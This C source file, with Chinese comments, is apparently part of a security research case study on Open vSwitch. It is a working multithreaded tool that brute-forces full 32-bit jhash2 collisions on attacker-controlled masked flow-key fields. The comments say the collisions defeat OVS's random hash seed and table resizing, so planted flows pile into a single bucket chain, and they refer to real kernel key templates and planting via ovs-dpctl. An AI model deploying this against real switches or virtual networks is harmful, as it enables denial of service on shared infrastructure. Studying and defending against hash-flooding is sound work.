// SPDX-License-Identifier: GPL-2.0
/*
 * find_jhash_collision.c — Part 3（OVS case study）攻擊 (A)：離線搜 full-hash collision。
 *
 * 目標:在攻擊者可控的 masked-key byte 上,搜出 K 個「完整 32-bit jhash2 值相同」的
 * key。因 OVS 的 bucket = jhash_1word(flow_hash(key), hash_seed) & (m-1),完整
 * jhash2 相同的 key 經 jhash_1word(同值, 任何 seed) 仍相同 → 落同一 bucket,與隨機
 * hash_seed、與 n_buckets resize 都無關(seed-independent)。見 notes/formal_model.md §5a。
 *
 * 成本模型:固定目標值 t,每個候選命中機率 2^-32 → 期望 K·2^32 次 jhash2
 * (見 notes/attack_cost.md)。本工具輸出實際 tries 與牆鐘,供與該模型對照。
 *
 * jhash2 為核心 include/linux/jhash.h 逐字移植(seed=0 = OVS flow_hash),務必逐位元
 * 一致,否則搜出的碰撞在真實表裡不會碰撞。最終正確性以「植入後 ovs_buckets 看到單一
 * 長 chain」交叉驗證。
 *
 * masked-key 模型:OVS flow_hash 雜湊 sw_flow_key 的一段連續 byte(range,長度為 4 的
 * 倍數),內容為 masked key(wildcard 掉的位元為 0)。本工具把它建成 nwords 個 u32,
 * 其中 [var_start, var_start+var_words) 為攻擊者可動欄位,其餘為固定常數(代表 wildcard=0
 * 或被規則釘住的欄位如 dst_ip)。植入時須讓 ovs-dpctl 的 flow key 對應到同一 byte 佈局。
 *
 * 編譯:make    執行:./find_jhash_collision --help
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <time.h>
#include <getopt.h>

/* ---- 核心 jhash.h 逐字移植(seed=0)---- */
#define JHASH_INITVAL 0xdeadbeef
static inline uint32_t rol32(uint32_t w, unsigned int s)
{
	return (w << s) | (w >> (32 - s));
}
#define __jhash_mix(a, b, c)			\
{						\
	a -= c;  a ^= rol32(c, 4);  c += b;	\
	b -= a;  b ^= rol32(a, 6);  a += c;	\
	c -= b;  c ^= rol32(b, 8);  b += a;	\
	a -= c;  a ^= rol32(c, 16); c += b;	\
	b -= a;  b ^= rol32(a, 19); a += c;	\
	c -= b;  c ^= rol32(b, 4);  b += a;	\
}
#define __jhash_final(a, b, c)			\
{						\
	c ^= b; c -= rol32(b, 14);		\
	a ^= c; a -= rol32(c, 11);		\
	b ^= a; b -= rol32(a, 25);		\
	c ^= b; c -= rol32(b, 16);		\
	a ^= c; a -= rol32(c, 4);		\
	b ^= a; b -= rol32(a, 14);		\
	c ^= b; c -= rol32(b, 24);		\
}
static uint32_t jhash2(const uint32_t *k, uint32_t length, uint32_t initval)
{
	uint32_t a, b, c;

	a = b = c = JHASH_INITVAL + (length << 2) + initval;
	while (length > 3) {
		a += k[0];
		b += k[1];
		c += k[2];
		__jhash_mix(a, b, c);
		length -= 3;
		k += 3;
	}
	switch (length) {
	case 3: c += k[2]; /* fallthrough */
	case 2: b += k[1]; /* fallthrough */
	case 1: a += k[0];
		__jhash_final(a, b, c);
		break;
	case 0:
		break;
	}
	return c;
}

/* ---- per-thread PRNG:splitmix64 ---- */
static inline uint64_t splitmix64(uint64_t *s)
{
	uint64_t z = (*s += 0x9e3779b97f4a7c15ULL);
	z = (z ^ (z >> 30)) * 0xbf58476d1ce4e5b9ULL;
	z = (z ^ (z >> 27)) * 0x94d049bb133111ebULL;
	return z ^ (z >> 31);
}

/* ---- 共享狀態 ---- */
static int g_nwords, g_var_start, g_var_words, g_match_bits;
static uint32_t g_target, g_mask;
static uint32_t *g_base;          /* 固定常數模板(nwords 個 u32) */
static int g_K;
static uint32_t *g_found;         /* K * nwords,找到的 key */
static int g_nfound;
static unsigned long long g_tries;
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

static int same_key(const uint32_t *x, const uint32_t *y)
{
	return memcmp(x + g_var_start, y + g_var_start,
		      (size_t)g_var_words * 4) == 0;
}

static void *worker(void *arg)
{
	uint64_t st = *(uint64_t *)arg;
	uint32_t *cand = malloc((size_t)g_nwords * 4);
	unsigned long long local = 0, flushed = 0;

	memcpy(cand, g_base, (size_t)g_nwords * 4);
	for (;;) {
		int i;

		for (i = 0; i < g_var_words; i++)
			cand[g_var_start + i] = (uint32_t)splitmix64(&st);
		local++;
		if ((jhash2(cand, g_nwords, 0) & g_mask) == g_target) {
			pthread_mutex_lock(&g_lock);
			if (g_nfound < g_K) {
				int dup = 0, j;

				for (j = 0; j < g_nfound; j++)
					if (same_key(cand, g_found + (size_t)j * g_nwords)) {
						dup = 1;
						break;
					}
				if (!dup) {
					memcpy(g_found + (size_t)g_nfound * g_nwords,
					       cand, (size_t)g_nwords * 4);
					g_nfound++;
				}
			}
			int done = (g_nfound >= g_K);

			pthread_mutex_unlock(&g_lock);
			if (done)
				break;
		}
		if ((local & 0xfffff) == 0) {
			pthread_mutex_lock(&g_lock);
			g_tries += local - flushed;	/* 定期 flush,供主執行緒顯示即時進度 */
			flushed = local;
			int done = (g_nfound >= g_K);

			pthread_mutex_unlock(&g_lock);
			if (done)
				break;
		}
	}
	pthread_mutex_lock(&g_lock);
	g_tries += local - flushed;
	pthread_mutex_unlock(&g_lock);
	free(cand);
	return NULL;
}

static void usage(const char *p)
{
	fprintf(stderr,
"用法: %s [選項]\n"
"  --keys K          要搜的碰撞 key 數 (預設 16)\n"
"  --nwords N        masked key 的 u32 字數 (預設 22 = 88 bytes,OVS L3 路徑)\n"
"  --var-start I     可動欄位起始 word index (預設 20 = src_ip)\n"
"  --var-words W     可動 word 數 (預設 2 = src_ip+dst_ip,64 bit;須 >= ceil((32+log2 K)/32))\n"
"  --base FILE       固定常數模板 (每行一 hex word;parse_ovs_keydump.py --template 產出)。\n"
"                    **務必提供**,否則 g_base=全0 與 kernel 固定常數不符,碰撞在真實表無效。\n"
"  --bits B          比對 jhash2 的低 B 位 (預設 32 = 完整 hash collision;\n"
"                    <32 僅供快速驗證搜尋機制,非 seed-independent)\n"
"  --threads T       執行緒數 (預設 1)\n"
"  --out FILE        輸出找到的 key (hex)\n"
"  --help\n", p);
}

int main(int argc, char **argv)
{
	int nthreads = 1;
	const char *outpath = NULL;
	const char *basepath = NULL;

	/* OVS L3 masked-key 預設:22 words,可控 = src_ip(w20)+dst_ip(w21)。
	 * src_port/dst_port 共字於 wildcard 的 ct_zone/tp.flags,故不放入 var(避免
	 * 隨機到封包到不了的 key);需動 port 須改 byte 粒度。 */
	g_K = 16; g_nwords = 22; g_var_start = 20; g_var_words = 2; g_match_bits = 32;

	static struct option opts[] = {
		{"keys", 1, 0, 'k'}, {"nwords", 1, 0, 'n'},
		{"var-start", 1, 0, 's'}, {"var-words", 1, 0, 'w'},
		{"bits", 1, 0, 'b'}, {"threads", 1, 0, 't'},
		{"out", 1, 0, 'o'}, {"base", 1, 0, 'B'},
		{"help", 0, 0, 'h'}, {0, 0, 0, 0}
	};
	int c;

	while ((c = getopt_long(argc, argv, "k:n:s:w:b:t:o:B:h", opts, NULL)) != -1) {
		switch (c) {
		case 'k': g_K = atoi(optarg); break;
		case 'n': g_nwords = atoi(optarg); break;
		case 's': g_var_start = atoi(optarg); break;
		case 'w': g_var_words = atoi(optarg); break;
		case 'b': g_match_bits = atoi(optarg); break;
		case 't': nthreads = atoi(optarg); break;
		case 'o': outpath = optarg; break;
		case 'B': basepath = optarg; break;
		default: usage(argv[0]); return c == 'h' ? 0 : 1;
		}
	}
	if (g_var_start < 0 || g_var_words < 1 ||
	    g_var_start + g_var_words > g_nwords || g_match_bits < 1 ||
	    g_match_bits > 32 || g_K < 1) {
		usage(argv[0]);
		return 1;
	}

	g_mask = (g_match_bits == 32) ? 0xffffffffu : ((1u << g_match_bits) - 1);

	/* 固定常數模板 g_base:預設全 0;若給 --base 則讀真實 masked-key 模板
	 * (parse_ovs_keydump.py --template 產出,每行一個 hex word)。**務必用真實模板**,
	 * 否則固定常數(in_port/eth.type/proto…)與 kernel 不符,搜出的碰撞在真實表裡不會碰撞。
	 * 目標值 t = 模板(var 區=0)的 jhash2 低 B 位,保證至少有解、可重現。 */
	g_base = calloc(g_nwords, 4);
	g_found = calloc((size_t)g_K * g_nwords, 4);
	if (basepath) {
		FILE *bf = fopen(basepath, "r");
		char line[256];
		int i = 0;

		if (!bf) { perror("fopen --base"); return 1; }
		while (i < g_nwords && fgets(line, sizeof line, bf)) {
			char *p = line;

			while (*p == ' ' || *p == '\t') p++;
			if (*p == '#' || *p == '\n' || *p == '\0')
				continue;	/* 跳過註解 / 空行 */
			g_base[i++] = (uint32_t)strtoul(p, NULL, 16);
		}
		fclose(bf);
		if (i != g_nwords) {
			fprintf(stderr, "ERROR: --base 讀到 %d words,期望 %d\n", i, g_nwords);
			return 1;
		}
		/* var 區歸零:該段交給搜尋填,不受模板殘值影響 target。 */
		for (i = 0; i < g_var_words; i++)
			g_base[g_var_start + i] = 0;
	}
	g_target = jhash2(g_base, g_nwords, 0) & g_mask;

	printf("# find_jhash_collision\n");
	printf("# K=%d nwords=%d var=[%d,%d) bits=%d threads=%d target=0x%08x\n",
	       g_K, g_nwords, g_var_start, g_var_start + g_var_words,
	       g_match_bits, nthreads, g_target);

	struct timespec t0, t1;

	clock_gettime(CLOCK_MONOTONIC, &t0);
	pthread_t *th = malloc(sizeof(pthread_t) * nthreads);
	uint64_t *seeds = malloc(sizeof(uint64_t) * nthreads);

	for (int i = 0; i < nthreads; i++) {
		seeds[i] = 0x1234567890abcdefULL + (uint64_t)i * 0x100000001b3ULL;
		pthread_create(&th[i], NULL, worker, &seeds[i]);
	}

	/* 進度心跳:每 3 秒印 found/K、tries、rate、ETA(估:K*2^bits 期望嘗試數)。 */
	double exp_tries = (double)g_K * ((g_match_bits >= 32) ? 4294967296.0
						   : (double)(1u << g_match_bits));
	for (;;) {
		struct timespec ts = {3, 0};

		nanosleep(&ts, NULL);
		pthread_mutex_lock(&g_lock);
		int found = g_nfound;
		unsigned long long tr = g_tries;
		pthread_mutex_unlock(&g_lock);

		clock_gettime(CLOCK_MONOTONIC, &t1);
		double el = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
		double rate = el > 0 ? tr / el : 0;
		double eta = rate > 0 ? (exp_tries - tr) / rate : 0;

		if (found >= g_K)
			break;
		fprintf(stderr,
			"\r# 進度 found=%d/%d tries=%.3g rate=%.0fM/s elapsed=%.0fs ETA~%.0fs   ",
			found, g_K, (double)tr, rate / 1e6, el, eta > 0 ? eta : 0);
	}
	fprintf(stderr, "\n");

	for (int i = 0; i < nthreads; i++)
		pthread_join(th[i], NULL);
	clock_gettime(CLOCK_MONOTONIC, &t1);

	double secs = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;

	/* 驗證每個 key 確實命中 target */
	int ok = 1;

	for (int i = 0; i < g_nfound; i++)
		if ((jhash2(g_found + (size_t)i * g_nwords, g_nwords, 0) & g_mask) != g_target)
			ok = 0;

	printf("# found=%d/%d tries=%llu secs=%.2f rate=%.2fM/s verify=%s\n",
	       g_nfound, g_K, g_tries, secs,
	       g_tries / secs / 1e6, ok ? "OK" : "FAIL");
	printf("# expected tries (K * 2^bits) = %.3g\n",
	       (double)g_K * (double)(1ULL << g_match_bits));

	if (outpath) {
		FILE *f = fopen(outpath, "w");

		if (!f) { perror("fopen"); return 1; }
		fprintf(f, "# %d keys, %d u32 words each, jhash2&0x%x == 0x%08x\n",
			g_nfound, g_nwords, g_mask, g_target);
		for (int i = 0; i < g_nfound; i++) {
			for (int j = 0; j < g_nwords; j++)
				fprintf(f, "%08x ", g_found[(size_t)i * g_nwords + j]);
			fprintf(f, "\n");
		}
		fclose(f);
		printf("# wrote %d keys -> %s\n", g_nfound, outpath);
	}
	return ok ? 0 : 2;
}
